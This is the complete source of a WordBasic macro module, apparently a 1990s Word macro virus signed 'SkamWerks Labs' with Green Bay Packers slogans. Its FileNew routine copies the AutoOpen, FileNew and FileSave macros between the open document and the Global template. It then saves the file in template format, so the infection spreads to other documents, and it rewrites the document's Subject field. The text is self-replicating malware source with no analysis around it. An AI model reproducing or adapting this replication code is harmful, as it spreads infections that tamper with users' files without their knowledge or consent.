   Attribute VB_Name = "FileNew"

   Public Sub MAIN()
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Victory is ours.

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.FileSummaryInfo Subject:="Green Bay Packers -- Super Bowl XXXI Champions"

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"
        WordBasic.MacroCopy MacName$, "Global:FileNew"
        WordBasic.MacroCopy MacName$, "Global:FileSave"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   On Error GoTo -1: On Error GoTo FileNewHandler
        MacName$ = FName$ + ":FileNew"
        WordBasic.MacroCopy "Global:FileNew", MacName$
   FileNewHandler:

   On Error GoTo -1: On Error GoTo FileSaveHandler
        MacName$ = FName$ + ":FileSave"
        WordBasic.MacroCopy "Global:FileSave", MacName$
   FileSaveHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Go Pack Go!

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub
